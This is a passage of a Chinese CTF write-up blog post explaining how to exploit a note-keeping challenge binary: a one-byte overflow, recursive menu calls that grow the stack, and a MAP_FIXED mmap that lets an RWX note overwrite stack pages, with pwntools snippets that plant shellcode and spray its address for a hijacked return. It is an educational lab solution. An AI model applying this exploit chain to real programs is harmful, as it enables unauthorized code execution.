+</span><span id="__span-4-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-16"><span class="linenos" data-linenos="16 "></span>
+</span><span id="__span-4-17"><span class="linenos" data-linenos="17 "></span><span class="w">    </span><span class="n">select_menu</span><span class="p">();</span>
+</span><span id="__span-4-18"><span class="linenos" data-linenos="18 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p><code>command</code> 只有 1024 字节，但 <code>fgets(command, 1025, stdin)</code> 最多会写入 1024 个输入字符和 1 个字符串结束符，因此存在 1 字节溢出。</p>
+<p>不过这个点单独看并不好用。实际调试可以看到，这 1 字节主要影响附近的局部变量，例如 <code>menu</code> 的低字节。可是当前这轮 <code>switch</code> 已经执行完，函数马上再次调用 <code>select_menu()</code> 进入下一轮菜单，因此这个 1 字节覆盖很难直接劫持控制流。</p>
+<p>它更像是题目给出的提示：真正要关注的是 <code>select_menu()</code> 的递归结构，以及不断增长的栈。</p>
+<h2 id="_4">关键点一：递归菜单导致栈持续下降</h2>
+<p><code>select_menu()</code> 在函数末尾再次调用自己：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos="1 "></span><span class="n">select_menu</span><span class="p">();</span>
+</span></code></pre></div>
+<p>如果编译器没有做尾调用优化，那么每次选择菜单后都会创建一个新的栈帧，旧的栈帧不会释放。x86 的栈从高地址向低地址增长，所以每次递归都会让当前栈顶继续降低。</p>
+<p>在调试环境中，可以观察到每进入一次新的 <code>select_menu()</code>，栈大约下降：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span>0x430
+</span></code></pre></div>
+<p>这也是 exploit 中的常量：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos="1 "></span><span class="n">one_stack_offset</span> <span class="o">=</span> <span class="mh">0x430</span>
+</span><span id="__span-7-2"><span class="linenos" data-linenos="2 "></span><span class="n">ebp_start</span> <span class="o">=</span> <span class="mh">0xffffdc08</span>
+</span><span id="__span-7-3"><span class="linenos" data-linenos="3 "></span><span class="n">esp_start</span> <span class="o">=</span> <span class="mh">0xffffd7e0</span>
+</span></code></pre></div>
+<p>于是，随着菜单循环次数增加，活跃栈区间会不断变大。由于题目环境不开 ASLR，初始栈地址稳定，我们可以在脚本里估算当前递归深度对应的栈范围。</p>
+<h2 id="map_fixed">关键点二：<code>MAP_FIXED</code> 可以覆盖已有映射</h2>
+<p>题目自定义了一个所谓“安全”的 <code>mmap_s()</code>：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-8-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">mmap_s</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">off_t</span><span class="w"> </span><span class="n">offset</span><span class="p">){</span>
+</span><span id="__span-8-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">addr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">MAP_FIXED</span><span class="p">)</span><span class="w"> </span><span class="p">){</span>
+</span><span id="__span-8-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">        </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">tmp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-8-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/urandom&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span id="__span-8-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">==</span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+</span><span id="__span-8-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="o">!=</span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+</span><span id="__span-8-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">        </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span id="__span-8-8"><span class="linenos" data-linenos=" 8 "></span>
+</span><span id="__span-8-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">        </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="w"> </span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">addr</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFFF000</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x80000000</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-8-10"><span class="linenos" data-linenos="10 "></span>
+</span><span id="__span-8-11"><span class="linenos" data-linenos="11 "></span><span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span><span id="__span-8-12"><span class="linenos" data-linenos="12 "></span><span class="w">            </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mmap</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MAP_FIXED</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">);</span>
+</span><span id="__span-8-13"><span class="linenos" data-linenos="13 "></span><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">tmp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">MAP_FAILED</span><span class="p">){</span>
+</span><span id="__span-8-14"><span class="linenos" data-linenos="14 "></span><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">tmp</span><span class="p">;</span>
+</span><span id="__span-8-15"><span class="linenos" data-linenos="15 "></span><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-8-16"><span class="linenos" data-linenos="16 "></span><span class="w">            </span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-8-17"><span class="linenos" data-linenos="17 "></span><span class="w">                </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">addr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">PAGE_SIZE</span><span class="p">);</span>
+</span><span id="__span-8-18"><span class="linenos" data-linenos="18 "></span><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-8-19"><span class="linenos" data-linenos="19 "></span><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-8-20"><span class="linenos" data-linenos="20 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-8-21"><span class="linenos" data-linenos="21 "></span>
+</span><span id="__span-8-22"><span class="linenos" data-linenos="22 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">mmap</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">);</span>
+</span><span id="__span-8-23"><span class="linenos" data-linenos="23 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>它的本意是从 <code>/dev/urandom</code> 取一个随机地址，然后按页对齐，并强制设置最高位，让地址落在高地址区域。</p>
+<p>问题在于：它调用 <code>mmap()</code> 时加了 <code>MAP_FIXED</code>。</p>
+<p><code>MAP_FIXED</code> 的语义非常危险：如果目标地址已经存在映射，内核会先取消原映射，再把新映射放到这个地址。因此，当随机地址落到栈区间时，<code>mmap_s()</code> 就会把对应的栈页替换成一页新的 <code>RWX</code> note 内存。</p>
+<p>这意味着我们拿到的不只是普通 note，而是“覆盖到栈上的 note”。之后通过 <code>write_note()</code> 写这个 note，本质上就是在写那段栈内存。</p>
+<h2 id="_5">利用目标</h2>
+<p>利用时需要两块 note：</p>
+<ol>
+<li>一块普通 note，用来存放 shellcode。</li>
+<li>一块命中栈区间的 note，用来把栈内容覆盖成 shellcode 地址。</li>
+</ol>
+<p>因为程序会打印每次创建 note 的地址，所以脚本可以不断创建 note，并检查返回地址是否落在我们估算的栈区间内：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><span class="linenos" data-linenos="1 "></span><span class="k">if</span> <span class="p">(</span><span class="n">this_addr</span> <span class="o">&lt;</span> <span class="n">ebp_start</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">this_addr</span> <span class="o">&gt;</span> <span class="n">stack_addr</span><span class="p">):</span>
+</span><span id="__span-9-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">note_in_stack</span> <span class="o">=</span> <span class="p">(</span><span class="n">this_no</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">this_addr</span><span class="p">))</span>
+</span><span id="__span-9-3"><span class="linenos" data-linenos="3 "></span>    <span class="k">break</span>
+</span></code></pre></div>
+<p>这里的 <code>ebp_start</code> 是初始栈帧附近的高地址边界，<code>stack_addr</code> 是根据递归次数估算出来的当前低地址边界。只要 <code>this_addr</code> 落在这个区间，说明这次 <code>mmap_s()</code> 映射到了当前活跃栈区域。</p>
+<p>选择这个区间的原因是：</p>
+<ul>
+<li>栈从高地址向低地址增长。</li>
+<li>当前递归越深，已经占用的栈范围越大。</li>
+<li>只要 note 映射到当前栈顶以上、初始栈附近以下的位置，就有机会覆盖未来返回过程中会被使用到的栈数据。</li>
+</ul>
+<h2 id="_6">利用流程</h2>
+<h3 id="1-note">1. 不断创建 note，等待命中栈区间</h3>
+<p>脚本每次调用 <code>create_one()</code>，都会进入一层新的菜单递归，并获得新 note 的编号和地址：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><span class="linenos" data-linenos="1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">create_one</span><span class="p">():</span>
+</span><span id="__span-10-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;5. exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-10-3"><span class="linenos" data-linenos="3 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span><span id="__span-10-4"><span class="linenos" data-linenos="4 "></span>    <span class="n">data</span>      <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;- Select Menu -&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
+</span><span id="__span-10-5"><span class="linenos" data-linenos="5 "></span>    <span class="n">this_no</span>   <span class="o">=</span> <span class="nb">int</span><span class="p">(</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">10</span> <span class="p">)</span>
+</span><span id="__span-10-6"><span class="linenos" data-linenos="6 "></span>    <span class="n">this_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span> <span class="p">)</span>
+</span><span id="__span-10-7"><span class="linenos" data-linenos="7 "></span>    <span class="k">return</span> <span class="p">(</span><span class="n">this_no</span><span class="p">,</span> <span class="n">this_addr</span><span class="p">)</span>
+</span></code></pre></div>
+<p>如果这次映射地址没有落到栈区间，就继续创建。同时根据递归深度更新当前估算的栈低地址：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><span class="linenos" data-linenos="1 "></span><span class="k">if</span> <span class="p">(</span><span class="n">this_no</span> <span class="o">==</span> <span class="mi">255</span><span class="p">):</span>
+</span><span id="__span-11-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">delete_all</span><span class="p">()</span>
+</span><span id="__span-11-3"><span class="linenos" data-linenos="3 "></span>    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="n">one_stack_offset</span> <span class="o">*</span> <span class="mi">256</span>
+</span><span id="__span-11-4"><span class="linenos" data-linenos="4 "></span><span class="k">else</span><span class="p">:</span>
+</span><span id="__span-11-5"><span class="linenos" data-linenos="5 "></span>    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="n">one_stack_offset</span>
+</span></code></pre></div>
+<p>由于 <code>mem_arr</code> 最多保存 256 个 note，编号达到 255 后需要先删除所有 note，再继续尝试。删除 note 本身也会经过菜单递归，因此脚本同样要把这部分带来的栈下降计入 <code>stack_addr</code>。</p>
+<h3 id="2-shellcode-note">2. 创建 shellcode note</h3>
+<p>一旦找到了命中栈区间的 note，就再创建一个普通 note，用来放 shellcode：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><span class="linenos" data-linenos="1 "></span><span class="n">note_in_shell</span> <span class="o">=</span> <span class="n">create_one</span><span class="p">()</span>
+</span><span id="__span-12-2"><span class="linenos" data-linenos="2 "></span><span class="n">shellcode</span> <span class="o">=</span> <span class="mi">160</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span><span id="__span-12-3"><span class="linenos" data-linenos="3 "></span><span class="n">write_one</span><span class="p">(</span><span class="n">note_in_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">)</span>
+</span></code></pre></div>
+<p>这里前面放了一段 NOP sled，降低跳转误差带来的影响。</p>
+<h3 id="3-note">3. 覆盖栈 note</h3>
+<p>最后，把命中栈区间的 note 写满 shellcode note 的地址：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><span class="linenos" data-linenos="1 "></span><span class="n">write_one</span><span class="p">(</span><span class="n">note_in_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p32</span><span class="p">(</span><span class="n">note_in_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
+</span></code></pre></div>
+<p>这一步的效果是：把某段活跃栈内存改成大量相同的地址。之后当程序开始从递归调用中返回时，某一次 <code>ret</code> 会从这片被覆盖的栈中取返回地址，于是跳到 shellcode note。</p>
+<p>这里的“从递归调用中返回”是由菜单里的退出选项触发的。源码中 <code>5. exit</code> 对应的逻辑如下：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-14-1"><span class="linenos" data-linenos="1 "></span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
+</span><span id="__span-14-2"><span class="linenos" data-linenos="2 "></span><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;bye</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-14-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="k">return</span><span class="p">;</span>
+</span></code></pre></div>
+<p>但是程序的菜单不是普通 <code>while</code> 循环，而是在每次处理完菜单后递归调用自己：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-15-1"><span class="linenos" data-linenos="1 "></span><span class="n">select_menu</span><span class="p">();</span>
+</span></code></pre></div>
+<p>所以调用关系大致是：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><span class="linenos" data-linenos="1 "></span>select_menu 第 1 层
+</span><span id="__span-16-2"><span class="linenos" data-linenos="2 "></span>  -&gt; select_menu 第 2 层
+</span><span id="__span-16-3"><span class="linenos" data-linenos="3 "></span>    -&gt; select_menu 第 3 层
+</span><span id="__span-16-4"><span class="linenos" data-linenos="4 "></span>      -&gt; ...
+</span></code></pre></div>
+<p>当我们在最深的一层选择 <code>5</code> 时，当前这一层 <code>select_menu()</code> 会 <code>return</code>。返回到上一层后，上一层的 <code>select_menu()</code> 调用点后面也没有其他逻辑，于是上一层也会继续返回。这个过程会一直向外层展开。</p>
+<p>每一层函数返回时都会执行类似 <code>leave; ret</code> 的流程，从栈上恢复 <code>ebp</code> 并取出返回地址。前面我们已经把某段栈内容覆盖成了大量 shellcode note 的地址，因此只要某一次 <code>ret</code> 从这片区域取返回地址，控制流就会跳入 shellcode。</p>
+<h2 id="_7">为什么能够成功</h2>
+<p>整个利用链可以概括为：</p>
+<ol>
+<li>递归菜单让栈不断向低地址增长。</li>
+<li>不开 ASLR 使初始栈地址固定，脚本可以估算当前栈区间。</li>
+<li><code>mmap_s()</code> 使用随机高地址，但每次会打印实际映射地址。</li>
+<li><code>MAP_FIXED</code> 允许新 note 覆盖已有栈页。</li>
+<li>note 页具有 <code>RWX</code> 权限，可以直接放 shellcode。</li>
+<li>覆盖栈页后，把未来返回路径上的内容铺成 shellcode 地址。</li>
+<li>递归返回时触发 <code>ret</code>，控制流跳入 shellcode。</li>
+</ol>
+<p>这题最精髓的地方在于，不需要精确覆盖某一个保存返回地址。我们利用递归制造出一大片未来会被返回流程消费的栈空间，再用 <code>p32(shellcode_addr) * 1000</code> 粗暴铺满。只要某次 <code>ret</code> 从这片区域取值，就能完成劫持。</p>
+<h2 id="_8">总结</h2>
+<p>这题可以学到两个很重要的点：</p>
+<ul>
+<li>不受控的递归会持续消耗栈空间，在关闭 ASLR 的场景下甚至可以变成可预测的利用条件。</li>
+<li><code>MAP_FIXED</code> 非常危险，它不是“如果地址可用就映射”，而是“强制把映射放在这里，即使要覆盖原有映射”。</li>
+</ul>
+<p>因此，所谓的 <code>mmap_s()</code> 并没有让程序更安全，反而提供了覆盖栈映射的能力。配合可执行 note 页和地址泄露，最终就能稳定地把控制流导向 shellcode。</p>
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks! You can leave some advices in the comment section below. 
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+              
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+<h2 id="__comments">Comments</h2>
+<!-- Insert generated snippet here -->
+
+<script src="https://giscus.app/client.js"
+    data-repo="masterAllen/masterAllen.github.io"
+    data-repo-id="R_kgDOM_LyMQ"
+    data-category="General"
+    data-category-id="DIC_kwDOM_LyMc4Cl7rg"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+</script>
+
+<!-- Synchronize Giscus theme with palette -->
+<script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+        var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+        // Instruct Giscus to set theme
+        giscus.setAttribute("data-theme", theme)
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function () {
+        var ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function () {
+            var palette = __md_get("__palette")
+            if (palette && typeof palette.color === "object") {
+                var theme = palette.color.scheme === "slate"
+                    ? "transparent_dark"
+                    : "light"
+
+                // Instruct Giscus to change theme
+                var frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage(
+                    { giscus: { setConfig: { theme } } },
+                    "https://giscus.app"
+                )
+            }
+        })
+    })
+</script>
+
+                      
+                    
+                  </article>
+                  
+                    <div class="vercount-stats md-typeset" aria-label="网站访问统计">
+                      <span>本文阅读 <span id="vercount_value_page_pv">Loading</span> 次</span>
+                      <span>本站访问 <span id="vercount_value_site_pv">Loading</span> 次</span>
+                      <span>访客 <span id="vercount_value_site_uv">Loading</span> 人</span>
+                    </div>
+                  
+                </div>
+              
+              
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+            </div>
+            
+          </main>
+          
+            <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../34.echo2/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 34.echo2.md">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                34.echo2.md
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../36.alloca/" class="md-footer__link md-footer__link--next" aria-label="Next: 36.alloca.md">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                36.alloca.md
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 ~ now | 🚀 HONG Anlun (allen hong)
+    </div>
+  
+  
+    <div class="md-copyright__generator">
+      Made with
+      <a href="https://zensical.org/" target="_blank" rel="noopener">
+        Zensical
+      </a>
+    </div>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+          
+        </div>
+      </div>
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../../..","features":["navigation.instant","navigation.prune","navigation.tabs","navigation.path","navigation.indexes","header.autohide","navigation.footer"],"search":"../../../../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      
+      <script src="../../../../../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+        <script src="../../../../../javascripts/copy.js"></script>
+      
+        <script src="../../../../../javascripts/code-blocks.js"></script>
+      
+        <script src="../../../../../javascripts/collapsible-headings.js"></script>
+      
+        <script src="../../../../../javascripts/hide-details-toc.js"></script>
+      
+        <script src="../../../../../javascripts/resizable-sidebar.js"></script>
+      
+        <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
+      
+        <script src="../../../../../javascripts/review-tracker.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../../../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+      <script defer src="../../../../../javascripts/archive-filter.js"></script>
+      <script defer src="../../../../../javascripts/pdf-inline.js"></script>
+      <script defer src="../../../../../javascripts/html-inline.js" data-resource-origin=""></script>
+      <script defer src="../../../../../javascripts/media-notes.js?v=20261021"></script>
+      
+      
+      
+        <script defer src="https://events.vercount.one/js"></script>
+      
+    
+  </body>
+</html>
